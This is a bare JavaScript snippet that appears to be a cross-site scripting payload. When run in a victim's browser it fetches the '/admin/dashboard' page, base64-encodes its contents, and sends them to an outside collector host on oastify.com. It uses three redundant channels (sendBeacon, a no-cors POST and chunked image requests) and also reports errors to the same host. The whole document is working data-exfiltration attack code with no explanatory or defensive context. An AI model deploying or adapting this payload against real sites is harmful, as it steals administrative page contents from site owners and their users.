(async()=>{
  var c='zehmmthvqpdrli28nbm14p482z8qwit6i.oastify.com';
  try{
    var r=await fetch('/admin/dashboard');
    var t=await r.text();
    var b=btoa(unescape(encodeURIComponent(t)));
    navigator.sendBeacon('//'+c+'/dash',b);
    fetch('//'+c+'/post',{method:'POST',body:b,mode:'no-cors'});
    for(var i=0;i<b.length;i+=1900){
      new Image().src='//'+c+'/c?i='+Math.floor(i/1900)+'&d='+encodeURIComponent(b.substring(i,i+1900));
    }
  }catch(e){
    new Image().src='//'+c+'/err?e='+encodeURIComponent(e.message);
  }
})();
